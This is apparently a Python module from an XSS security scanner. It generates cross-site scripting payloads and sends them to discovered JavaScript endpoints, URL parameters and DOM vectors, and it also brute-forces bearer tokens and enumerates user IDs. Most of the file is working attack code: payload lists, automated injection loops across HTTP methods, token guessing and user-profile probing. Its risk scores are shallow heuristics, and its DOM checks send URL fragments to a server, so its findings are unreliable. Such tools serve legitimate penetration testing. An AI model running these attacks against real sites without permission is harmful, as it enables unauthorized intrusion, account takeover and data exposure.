# xss_security_gui/auto_modules/dom_and_endpoints.py
"""
DOM & Endpoint Attacks — ULTRA 9.0

- Уніфікована модель результатів
- Стійкі мережеві запити (timeouts, errors)
- Кореляція DOM-векторів з CSP
- Автоматичний генератор XSS‑payload'ів
- Чиста архітектура, готова до Threat Intel
"""

from __future__ import annotations

import time
from typing import Any, Dict, List, Iterable
import re
import requests
from urllib.parse import urljoin


# ============================================================
#  Payload generator — AGGRESSIVE 4.0
# ============================================================

def generate_xss_payloads(context: str | None = None) -> List[Dict[str, Any]]:
    """
    Автоматический генератор XSS‑payload'ов.
    Возвращает список payload-объектов с расширенной аналитикой:
    - entropy_score
    - pattern_score
    - context_score
    - risk_score
    - total_score
    - fingerprint
    - severity
    """

    base = [
        "<img src=x onerror=alert(1)>",
        "\"'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ]

    attr_payloads = [
        "\" onmouseover=alert(1) x=\"",
        "' autofocus onfocus=alert(1) '",
    ]

    url_payloads = [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]

    dom_payloads = [
        "#<img src=x onerror=alert(1)>",
        "#</script><script>alert(1)</script>",
    ]

    if context == "attr":
        payloads = base + attr_payloads
    elif context == "url":
        payloads = base + url_payloads
    elif context == "dom":
        payloads = base + dom_payloads
    else:
        payloads = base + attr_payloads + url_payloads + dom_payloads

    enhanced = []

    for p in payloads:
        entropy_score = len(set(p))
        length_score = len(p) // 5

        pattern_score = (
            (3 if "<script" in p.lower() else 0) +
            (3 if "onerror" in p.lower() else 0) +
            (2 if "svg" in p.lower() else 0) +
            (1 if "iframe" in p.lower() else 0)
        )

        context_score = (
            (2 if context == "dom" else 0) +
            (1 if context == "attr" else 0)
        )

        risk_score = (
            (3 if "<script" in p.lower() else 0) +
            (2 if "alert" in p.lower() else 0)
        )

        total_score = entropy_score + length_score + pattern_score + context_score + risk_score
        fingerprint = hash(p[:200])

        severity = (
            "critical" if risk_score >= 3 else
            "high" if risk_score >= 2 else
            "medium"
        )

        enhanced.append({
            "payload": p,
            "context": context,
            "entropy_score": entropy_score,
            "length_score": length_score,
            "pattern_score": pattern_score,
            "context_score": context_score,
            "risk_score": risk_score,
            "total_score": total_score,
            "fingerprint": fingerprint,
            "severity": severity,
        })

    return enhanced


# ============================================================
#  CSP correlation helpers — AGGRESSIVE 4.0
# ============================================================

def _parse_csp(csp_header: str) -> Dict[str, Any]:
    """
    Парсер CSP с расширенной аналитикой:
    - entropy_score
    - pattern_score
    - risk_score
    - fingerprint
    """

    result: Dict[str, List[str]] = {}
    if not csp_header:
        return {
            "directives": {},
            "entropy_score": 0,
            "pattern_score": 0,
            "risk_score": 3,
            "fingerprint": 0,
            "severity": "high",
        }

    for part in csp_header.split(";"):
        part = part.strip()
        if not part:
            continue
        pieces = part.split()
        if not pieces:
            continue
        directive, *sources = pieces
        result[directive.lower()] = sources

    entropy_score = len(set(csp_header))
    pattern_score = (
        (3 if "unsafe-inline" in csp_header.lower() else 0) +
        (3 if "unsafe-eval" in csp_header.lower() else 0)
    )
    risk_score = (
        (3 if "unsafe-inline" in csp_header.lower() else 0) +
        (2 if "unsafe-eval" in csp_header.lower() else 0)
    )

    fingerprint = hash(csp_header[:300])

    severity = (
        "critical" if risk_score >= 3 else
        "high" if risk_score >= 2 else
        "medium"
    )

    return {
        "directives": result,
        "entropy_score": entropy_score,
        "pattern_score": pattern_score,
        "risk_score": risk_score,
        "fingerprint": fingerprint,
        "severity": severity,
    }


def _csp_allows_inline_script(csp_header: str) -> bool:
    """Проверяет, разрешены ли inline‑скрипты по CSP."""
    parsed = _parse_csp(csp_header)["directives"]
    script_src = parsed.get("script-src") or parsed.get("default-src") or []
    if not script_src:
        return True
    return "'unsafe-inline'" in script_src


def _csp_allows_eval_like(csp_header: str) -> bool:
    """Проверяет, разрешены ли eval/new Function по CSP (unsafe-eval)."""
    parsed = _parse_csp(csp_header)["directives"]
    script_src = parsed.get("script-src") or parsed.get("default-src") or []
    return "'unsafe-eval'" in script_src


def _csp_risk_for_dom_vector(vector: str, csp_header: str) -> str:
    """
    Коррелирует DOM‑вектор с CSP и возвращает расширенную аналитику:
    - entropy_score
    - pattern_score
    - risk_score
    - context_score
    - total_score
    - fingerprint
    - severity
    """

    if not csp_header:
        return {
            "vector": vector,
            "risk_score": 3,
            "entropy_score": len(set(vector)),
            "pattern_score": 2,
            "context_score": 1,
            "total_score": 6,
            "fingerprint": hash(vector),
            "severity": "critical",
        }

    parsed = _parse_csp(csp_header)
    allows_inline = _csp_allows_inline_script(csp_header)
    allows_eval = _csp_allows_eval_like(csp_header)

    v = vector.lower()

    entropy_score = len(set(v))
    pattern_score = (
            (3 if v in ("settimeout", "setinterval", "postmessage") else 0) +
            (2 if v in ("window.name", "location.hash") else 0)
    )

    risk_score = (
            (3 if allows_inline else 0) +
            (2 if allows_eval else 0)
    )

    context_score = (
            (2 if "window" in v else 0) +
            (1 if "location" in v else 0)
    )

    total_score = entropy_score + pattern_score + risk_score + context_score
    fingerprint = hash((v + csp_header)[:300])

    severity = (
        "critical" if risk_score >= 3 else
        "high" if risk_score >= 2 else
        "medium"
    )

    return {
        "vector": vector,
        "entropy_score": entropy_score,
        "pattern_score": pattern_score,
        "risk_score": risk_score,
        "context_score": context_score,
        "total_score": total_score,
        "fingerprint": fingerprint,
        "severity": severity,
    }


# ============================================================
#  Internal helpers — AGGRESSIVE 4.0
# ============================================================

def _safe_request(method: str, url: str, payload: Any = None, timeout: int = 5) -> Dict[str, Any]:
    """Безопасный HTTP-запрос с расширенной аналитикой."""
    try:
        start = time.time()

        method = method.upper()
        if method == "GET":
            r = requests.get(url, params=payload, timeout=timeout)
        elif method == "POST":
            r = requests.post(url, data=payload, timeout=timeout)
        elif method == "PUT":
            r = requests.put(url, data=payload, timeout=timeout)
        elif method == "DELETE":
            r = requests.delete(url, timeout=timeout)
        else:
            return {
                "response": None,
                "elapsed_ms": 0.0,
                "error": f"unsupported method {method}",
                "entropy_score": 0,
                "risk_score": 1,
                "pattern_score": 0,
                "context_score": 0,
                "total_score": 1,
                "fingerprint": hash(method + url),
            }

        elapsed = (time.time() - start) * 1000.0

        text_sample = (r.text or "")[:500]
        entropy_score = len(set(text_sample))
        pattern_score = (
            (3 if "<script" in text_sample.lower() else 0) +
            (2 if "alert(" in text_sample.lower() else 0)
        )
        risk_score = (
            (3 if r.status_code >= 500 else 0) +
            (2 if r.status_code in (401, 403) else 0)
        )
        context_score = (
            (2 if url.startswith("https://") else 0) +
            (1 if "api" in url.lower() else 0)
        )

        total_score = entropy_score + pattern_score + risk_score + context_score
        fingerprint = hash((method + url + text_sample)[:300])

        return {
            "response": r,
            "elapsed_ms": elapsed,
            "error": None,
            "entropy_score": entropy_score,
            "pattern_score": pattern_score,
            "risk_score": risk_score,
            "context_score": context_score,
            "total_score": total_score,
            "fingerprint": fingerprint,
        }

    except Exception as e:
        msg = str(e)
        entropy_score = len(set(msg))
        risk_score = 3
        pattern_score = 1
        context_score = 0
        total_score = entropy_score + risk_score + pattern_score + context_score

        return {
            "response": None,
            "elapsed_ms": 0.0,
            "error": msg,
            "entropy_score": entropy_score,
            "pattern_score": pattern_score,
            "risk_score": risk_score,
            "context_score": context_score,
            "total_score": total_score,
            "fingerprint": hash(msg[:300]),
        }


def _reflects(payload: str, text: str) -> Dict[str, Any]:
    """Проверка отражения XSS-пейлоада с аналитикой."""
    if not text:
        return {
            "reflected": False,
            "entropy_score": 0,
            "pattern_score": 0,
            "risk_score": 0,
            "context_score": 0,
            "total_score": 0,
            "fingerprint": 0,
        }

    window = text[:20000]
    reflected = payload in window

    entropy_score = len(set(window[:500]))
    pattern_score = (
        (3 if "<script" in window.lower() else 0) +
        (2 if "alert(" in window.lower() else 0)
    )
    risk_score = 3 if reflected else 1
    context_score = (
        (2 if "<html" in window.lower() else 0) +
        (1 if "<body" in window.lower() else 0)
    )

    total_score = entropy_score + pattern_score + risk_score + context_score
    fingerprint = hash((payload + window[:300])[:300])

    severity = (
        "critical" if reflected else
        "low"
    )

    return {
        "reflected": reflected,
        "entropy_score": entropy_score,
        "pattern_score": pattern_score,
        "risk_score": risk_score,
        "context_score": context_score,
        "total_score": total_score,
        "fingerprint": fingerprint,
        "severity": severity,
    }


# ============================================================
#  JS Endpoint Attacks — AGGRESSIVE 4.0
# ============================================================

def attack_found_targets(
    engine,
    scripts: Iterable[Dict[str, Any]],
    payloads: List[str] | None = None,
    methods: List[str] | None = None,
):
    payload_objs = generate_xss_payloads("url")
    payloads = payloads or [p["payload"] for p in payload_objs]
    methods = methods or ["GET", "POST", "PUT", "DELETE"]

    engine._log("🔍 Запуск атак по найденным JS-эндпоинтам...")

    for script in scripts:
        if not isinstance(script, dict):
            engine._log(f"⚠️ Пропущен некорректный JS-объект: {script}", level="warn")
            continue

        fetches = (script.get("fetch_calls") or []) + (script.get("ajax_calls") or [])
        for endpoint in fetches:
            if not endpoint:
                continue

            if not str(endpoint).startswith("http"):
                endpoint = urljoin(engine.domain, endpoint)

            for method in methods:
                for payload in payloads:
                    req_info = _safe_request(method, endpoint, payload)
                    r = req_info["response"]

                    if req_info["error"] or r is None:
                        engine._record_result("endpoint_attack", {
                            "endpoint": endpoint,
                            "method": method,
                            "payload": payload,
                            "error": req_info["error"],
                            "elapsed_ms": req_info["elapsed_ms"],
                            "severity": "error",
                            "entropy_score": req_info["entropy_score"],
                            "pattern_score": req_info["pattern_score"],
                            "risk_score": req_info["risk_score"],
                            "context_score": req_info["context_score"],
                            "total_score": req_info["total_score"],
                            "fingerprint": req_info["fingerprint"],
                        })
                        continue

                    reflect_info = _reflects(payload, r.text or "")
                    reflected = reflect_info["reflected"]

                    severity = (
                        "high" if reflected else
                        "medium" if r.status_code >= 400 else
                        "low"
                    )

                    engine._record_result("endpoint_attack", {
                        "endpoint": endpoint,
                        "method": method,
                        "payload": payload,
                        "status": r.status_code,
                        "elapsed_ms": req_info["elapsed_ms"],
                        "reflected": reflected,
                        "response_size": len(r.content or b""),
                        "severity": severity,
                        "entropy_score": reflect_info["entropy_score"],
                        "pattern_score": reflect_info["pattern_score"],
                        "risk_score": reflect_info["risk_score"],
                        "context_score": reflect_info["context_score"],
                        "total_score": reflect_info["total_score"],
                        "fingerprint": reflect_info["fingerprint"],
                    })


# ============================================================
#  DOM Vector Attacks + CSP correlation — AGGRESSIVE 4.0
# ============================================================

def attack_dom_vectors(
    engine,
    scripts: Iterable[Dict[str, Any]],
    dom_payloads: Dict[str, str] | None = None,
    csp_header: str | None = None,
):
    """
    DOM‑атаки с учётом CSP и расширенной аналитикой.
    """
    dom_payloads = dom_payloads or {
        "setTimeout": f"{engine.domain}#alert(1)",
        "setInterval": f"{engine.domain}#alert(1)",
        "window.name": "javascript:window.name='<img src=x onerror=alert(1)>'",
        "location.hash": f"{engine.domain}#<img src=x onerror=alert(1)>",
        "postMessage": "window.postMessage('alert(1)', '*');",
    }

    engine._log("🚀 DOM атака началась...")

    csp_header = csp_header or ""
    for script in scripts:
        if not isinstance(script, dict):
            continue

        sensitive = script.get("xss_sensitive") or []
        for vector in sensitive:
            payload_url = dom_payloads.get(vector)
            if not payload_url:
                continue

            req_info = _safe_request("GET", payload_url)
            r = req_info["response"]

            csp_info = _csp_risk_for_dom_vector(vector, csp_header)

            if req_info["error"] or r is None:
                engine._record_result("dom_vector_attack", {
                    "vector": vector,
                    "url": payload_url,
                    "error": req_info["error"],
                    "severity": "error",
                    "csp": csp_header,
                    "csp_risk": csp_info,
                    "elapsed_ms": req_info["elapsed_ms"],
                    "entropy_score": req_info["entropy_score"],
                    "pattern_score": req_info["pattern_score"],
                    "risk_score": req_info["risk_score"],
                    "context_score": req_info["context_score"],
                    "total_score": req_info["total_score"],
                    "fingerprint": req_info["fingerprint"],
                })
                continue

            reflect_info = _reflects("alert(1)", r.text or "")
            reflected = reflect_info["reflected"]

            base_severity = "high" if reflected else "low"
            csp_risk_level = csp_info["severity"]

            if reflected and csp_risk_level in ("critical", "high"):
                severity = "high"
            elif reflected and csp_risk_level == "medium":
                severity = "high"
            elif not reflected and csp_risk_level in ("critical", "high"):
                severity = "medium"
            else:
                severity = base_severity

            engine._record_result("dom_vector_attack", {
                "vector": vector,
                "url": payload_url,
                "status": r.status_code,
                "elapsed_ms": req_info["elapsed_ms"],
                "reflected": reflected,
                "severity": severity,
                "csp": csp_header,
                "csp_risk": csp_info,
                "entropy_score": reflect_info["entropy_score"],
                "pattern_score": reflect_info["pattern_score"],
                "risk_score": reflect_info["risk_score"],
                "context_score": reflect_info["context_score"],
                "total_score": reflect_info["total_score"],
                "fingerprint": reflect_info["fingerprint"],
            })


# ============================================================
#  Header Generator — AGGRESSIVE 4.0
# ============================================================

def build_headers_list(tokens):
    """
    Генератор заголовков с расширенной аналитикой:
    - entropy_score
    - pattern_score
    - risk_score
    - context_score
    - total_score
    - fingerprint
    """

    base_headers = [
        {},
        {"X-API-Key": "XSS-KEY"},
        {"Authorization": "Bearer XSS-Token"},
        {"Cookie": "session=XSSSESSION"},
        {"Cookie": "auth=XSSAUTH"},
        {"Cookie": "jwt=XSS-JWT"},
    ]

    headers_set = []

    for h in base_headers:
        entropy_score = len(set(str(h)))
        pattern_score = (
            (3 if "Authorization" in h else 0) +
            (2 if "Cookie" in h else 0)
        )
        risk_score = (
            (3 if "jwt" in str(h).lower() else 0) +
            (2 if "session" in str(h).lower() else 0)
        )
        context_score = 1
        total_score = entropy_score + pattern_score + risk_score + context_score
        fingerprint = hash(str(h)[:200])

        headers_set.append({
            "headers": h,
            "entropy_score": entropy_score,
            "pattern_score": pattern_score,
            "risk_score": risk_score,
            "context_score": context_score,
            "total_score": total_score,
            "fingerprint": fingerprint,
        })

    for token in tokens:
        if isinstance(token, dict):
            name = token.get("name") or token.get("header") or "X-Token"
            value = token.get("value") or "XSS-Test"
            h = {name: value}
        else:
            h = {token: "XSS-Test"}

        entropy_score = len(set(str(h)))
        pattern_score = (
            (3 if "Authorization" in h else 0) +
            (2 if "Token" in str(h) else 0)
        )
        risk_score = (
            (3 if "jwt" in str(h).lower() else 0) +
            (2 if "auth" in str(h).lower() else 0)
        )
        context_score = 1
        total_score = entropy_score + pattern_score + risk_score + context_score
        fingerprint = hash(str(h)[:2000])

        headers_set.append({
            "headers": h,
            "entropy_score": entropy_score,
            "pattern_score": pattern_score,
            "risk_score": risk_score,
            "context_score": context_score,
            "total_score": total_score,
            "fingerprint": fingerprint,
        })

    return headers_set


# ============================================================
#  API Endpoint Attacks — AGGRESSIVE 4.0
# ============================================================

def attack_api_endpoints(engine, session, base_url, endpoints, headers_list, log_func):
    log_func("🔷 API Endpoint Attacks...")

    for ep in endpoints:
        url = urljoin(base_url, ep)

        for header_obj in headers_list:
            headers = header_obj["headers"]

            try:
                r = session.get(url, headers=headers, timeout=5)
                text_sample = (r.text or "")[:500]

                reflected = "alert" in text_sample.lower()

                entropy_score = len(set(text_sample))
                pattern_score = (
                    (3 if "<script" in text_sample.lower() else 0) +
                    (2 if "alert(" in text_sample.lower() else 0)
                )
                risk_score = (
                    (3 if reflected else 0) +
                    (2 if r.status_code >= 400 else 0)
                )
                context_score = (
                    (2 if url.startswith("https://") else 0) +
                    (1 if "api" in url.lower() else 0)
                )

                total_score = entropy_score + pattern_score + risk_score + context_score
                fingerprint = hash((ep + str(headers) + text_sample)[:300])

                severity = (
                    "critical" if risk_score >= 3 else
                    "high" if risk_score >= 2 else
                    "medium" if reflected else
                    "low"
                )

                engine._record_result("api_attack", {
                    "endpoint": ep,
                    "status": r.status_code,
                    "headers": headers,
                    "reflected": reflected,
                    "severity": severity,
                    "entropy_score": entropy_score,
                    "pattern_score": pattern_score,
                    "risk_score": risk_score,
                    "context_score": context_score,
                    "total_score": total_score,
                    "fingerprint": fingerprint,
                })

            except Exception as e:
                msg = str(e)
                entropy_score = len(set(msg))
                risk_score = 3
                pattern_score = 1
                context_score = 0
                total_score = entropy_score + risk_score + pattern_score + context_score

                engine._record_result("api_attack", {
                    "endpoint": ep,
                    "error": msg,
                    "severity": "error",
                    "entropy_score": entropy_score,
                    "pattern_score": pattern_score,
                    "risk_score": risk_score,
                    "context_score": context_score,
                    "total_score": total_score,
                    "fingerprint": hash(msg[:200]),
                })


# ============================================================
#  Token Brute Force — AGGRESSIVE 4.0
# ============================================================

def attack_tokens(engine, session, base_url, token_candidates, log_func):
    log_func("🔷 Token Brute Force...")

    for token in token_candidates:
        try:
            r = session.get(
                base_url,
                headers={"Authorization": f"Bearer {token}"},
                timeout=5,
            )

            reflected = "alert" in ((r.text or "")[:500]).lower()

            entropy_score = len(set(token))
            pattern_score = (
                (3 if "." in token else 0) +
                (2 if "-" in token else 0)
            )
            risk_score = (
                (3 if r.status_code == 200 else 0) +
                (2 if reflected else 0)
            )
            context_score = (
                (2 if "auth" in base_url.lower() else 0)
            )

            total_score = entropy_score + pattern_score + risk_score + context_score
            fingerprint = hash((token + base_url)[:300])

            severity = (
                "critical" if risk_score >= 3 else
                "high" if risk_score >= 2 else
                "medium"
            )

            engine._record_result("token_attack", {
                "token": token,
                "status": r.status_code,
                "severity": severity,
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        except Exception as e:
            msg = str(e)
            entropy_score = len(set(msg))
            risk_score = 3
            pattern_score = 1
            context_score = 0
            total_score = entropy_score + risk_score + pattern_score + context_score

            engine._record_result("token_attack", {
                "token": token,
                "error": msg,
                "severity": "error",
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": hash(msg[:200]),
            })


# ============================================================
#  Parameter Attacks — AGGRESSIVE 4.0
# ============================================================

def attack_parameters(engine, session, base_url, parameters, log_func):
    log_func("🔷 Parameter Attacks...")

    payload = "<script>alert(1)</script>"

    for param in parameters:
        try:
            r = session.get(base_url, params={param: payload}, timeout=5)
            text_sample = (r.text or "")[:500]

            reflected = payload in text_sample

            entropy_score = len(set(text_sample))
            pattern_score = (
                (3 if "<script" in text_sample.lower() else 0) +
                (2 if "alert(" in text_sample.lower() else 0)
            )
            risk_score = (
                (3 if reflected else 0) +
                (2 if r.status_code >= 400 else 0)
            )
            context_score = (
                (2 if "api" in base_url.lower() else 0)
            )

            total_score = entropy_score + pattern_score + risk_score + context_score
            fingerprint = hash((param + text_sample)[:300])

            severity = (
                "critical" if risk_score >= 3 else
                "high" if risk_score >= 2 else
                "medium" if reflected else
                "low"
            )

            engine._record_result("param_attack", {
                "param": param,
                "status": r.status_code,
                "reflected": reflected,
                "severity": severity,
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        except Exception as e:
            msg = str(e)
            entropy_score = len(set(msg))
            risk_score = 3
            pattern_score = 1
            context_score = 0
            total_score = entropy_score + risk_score + pattern_score + context_score

            engine._record_result("param_attack", {
                "param": param,
                "error": msg,
                "severity": "error",
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": hash(msg[:200]),
            })


# ============================================================
#  User ID Attacks — AGGRESSIVE 4.0
# ============================================================

def attack_user_ids(engine, session, base_url, user_ids, log_func):
    log_func("🔷 User ID Attacks...")

    for uid in user_ids:
        url = f"{base_url}/user/{uid}"

        try:
            r = session.get(url, timeout=5)
            text_sample = (r.text or "")[:500].lower()

            profile_detected = "profile" in text_sample
            reflected = "alert(" in text_sample

            entropy_score = len(set(text_sample))
            pattern_score = (
                (3 if "profile" in text_sample else 0) +
                (2 if "user" in text_sample else 0)
            )
            risk_score = (
                (3 if profile_detected else 0) +
                (2 if reflected else 0)
            )
            context_score = (
                (2 if url.startswith("https://") else 0) +
                (1 if "/user/" in url else 0)
            )

            total_score = entropy_score + pattern_score + risk_score + context_score
            fingerprint = hash((uid + url + text_sample)[:300])

            severity = (
                "critical" if risk_score >= 3 else
                "high" if risk_score >= 2 else
                "medium" if profile_detected else
                "low"
            )

            engine._record_result("user_attack", {
                "user_id": uid,
                "status": r.status_code,
                "profile_detected": profile_detected,
                "reflected": reflected,
                "severity": severity,
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        except Exception as e:
            msg = str(e)
            entropy_score = len(set(msg))
            risk_score = 3
            pattern_score = 1
            context_score = 0
            total_score = entropy_score + risk_score + pattern_score + context_score

            engine._record_result("user_attack", {
                "user_id": uid,
                "error": msg,
                "severity": "error",
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": hash(msg[:200]),
            })


# ============================================================
# XSS Target Attacks — AGGRESSIVE 4.0
# ============================================================

def attack_xss_targets(engine, session, base_url, xss_targets, log_func):
    log_func("🔷 XSS Target Attacks...")

    payload = "<img src=x onerror=alert(1)>"

    for target in xss_targets:
        url = urljoin(base_url, target)

        try:
            r = session.get(url, params={"q": payload}, timeout=5)
            text_sample = (r.text or "")[:500]

            reflected = payload in text_sample

            entropy_score = len(set(text_sample))
            pattern_score = (
                (3 if "<script" in text_sample.lower() else 0) +
                (2 if "alert(" in text_sample.lower() else 0)
            )
            risk_score = (
                (3 if reflected else 0) +
                (2 if r.status_code >= 400 else 0)
            )
            context_score = (
                (2 if url.startswith("https://") else 0) +
                (1 if "search" in url.lower() else 0)
            )

            total_score = entropy_score + pattern_score + risk_score + context_score
            fingerprint = hash((target + text_sample)[:300])

            severity = (
                "critical" if risk_score >= 3 else
                "high" if risk_score >= 2 else
                "medium" if reflected else
                "low"
            )

            engine._record_result("xss_target_attack", {
                "target": target,
                "status": r.status_code,
                "reflected": reflected,
                "severity": severity,
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        except Exception as e:
            msg = str(e)
            entropy_score = len(set(msg))
            risk_score = 3
            pattern_score = 1
            context_score = 0
            total_score = entropy_score + risk_score + pattern_score + context_score

            engine._record_result("xss_target_attack", {
                "target": target,
                "error": msg,
                "severity": "error",
                "entropy_score": entropy_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": hash(msg[:200]),
            })

# ============================================================
#  AI Payload Suggestion Engine — AGGRESSIVE 4.0
# ============================================================
def ai_suggest_payloads_from_context(
    context_snippets: Iterable[str],
    hint: str | None = None,
) -> List[Dict[str, Any]]:
    """
    AutoPayload AI‑генератор с расширенной аналитикой:
    - entropy_score
    - pattern_score
    - risk_score
    - context_score
    - total_score
    - fingerprint
    """

    joined = "\n".join(s or "" for s in context_snippets).lower()

    base_payloads = generate_xss_payloads()

    if any(k in joined for k in ["innerhtml", "outerhtml", "insertadjacenthtml"]):
        base_payloads.extend(generate_xss_payloads("html"))

    if any(k in joined for k in ["location", "hash", "search", "query"]):
        base_payloads.extend(generate_xss_payloads("url"))

    if any(k in joined for k in ["eval(", "new function", "settimeout", "setinterval"]):
        base_payloads.extend(generate_xss_payloads("dom"))

    if re.search(r"\{\{.*?\}\}", joined) or "${" in joined:
        base_payloads.append({"payload": "{{<img src=x onerror=alert(1)>}}"})
        base_payloads.append({"payload": "${alert(1)}"})

    if "json.parse" in joined or "json.stringify" in joined:
        base_payloads.append({"payload": '"}];alert(1);//'})
        base_payloads.append({"payload": '"},"x":"<img src=x onerror=alert(1)>"}'})

    if hint:
        base_payloads.extend(generate_xss_payloads(hint))

    # Убираем дубликаты
    seen = set()
    final = []

    for p in base_payloads:
        payload = p["payload"] if isinstance(p, dict) else p
        payload = str(payload)  # 🔥 FIX: always hashable

        if payload in seen:
            continue
        seen.add(payload)

        entropy_score = len(set(payload))
        pattern_score = (
            (3 if "<script" in payload.lower() else 0) +
            (2 if "onerror" in payload.lower() else 0)
        )
        risk_score = (
            (3 if "alert(" in payload.lower() else 0)
        )
        context_score = (
            (2 if "img" in payload.lower() else 0) +
            (1 if "svg" in payload.lower() else 0)
        )

        total_score = entropy_score + pattern_score + risk_score + context_score
        fingerprint = hash(payload[:200])

        final.append({
            "payload": payload,
            "entropy_score": entropy_score,
            "pattern_score": pattern_score,
            "risk_score": risk_score,
            "context_score": context_score,
            "total_score": total_score,
            "fingerprint": fingerprint,
        })

    return final

